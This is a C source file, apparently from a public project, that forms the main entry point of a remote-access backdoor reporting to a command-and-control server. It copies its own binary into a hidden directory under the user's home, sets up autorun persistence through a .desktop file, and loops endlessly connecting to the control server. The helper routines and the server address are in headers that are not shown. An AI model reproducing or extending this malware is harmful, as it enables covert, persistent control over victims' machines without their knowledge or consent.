// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Initialization of the communication with the C&C server
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include <stdio.h>
#include <string.h>
#include <libgen.h>
#include <pwd.h>
#include <unistd.h>

#include "../include/sockets.h"
#include "../include/footprint.h"
#include "../include/persistence.h"
#include "../include/commands.h"
#include "../include/information.h"

/*
 * The entry point of the program. The program can't be executed with arguments.
 * Starts the communication with the server after creating a directory,
 * making a copy of the program itself to the created directory and creating
 * a .desktop file for autorun
 */
int
main(int argc, char *argv[]) {
    struct passwd   *user;
    char            destination_path[256] = { 0 };
    char            *exec_filename;
    char            *safe_exec_filename;
    host_t          host;

    (void)argc;  // to prevent compiler warning about unused argc
    user = getpwuid(getuid());
    host = get_host_info();
 
    safe_exec_filename = strdup(argv[0]);  // for safe use of basename()
    exec_filename = basename(safe_exec_filename);
    destination_path[sizeof destination_path - 1] = '\0';
    snprintf(destination_path, sizeof destination_path,
             "%s/.local/bin/", user->pw_dir);
    if (!file_exists(destination_path)) {
        if (create_dir(destination_path)) {
            strcat(destination_path, exec_filename);
            hide_file(argv[0], destination_path);
        }
    }
    strcat(destination_path, exec_filename);
    if (!file_exists(destination_path)) {
        hide_file(argv[0], destination_path);
    }
    if (safe_exec_filename != NULL) {
        free(safe_exec_filename);
    }
    while (1) {
        int16_t server_socket = connect_to_server();

        if (file_exists(destination_path)) {
            host.autorun_enabled = persistence(destination_path);
        }
        start_communication(server_socket, host);
    }
    return 0;
}
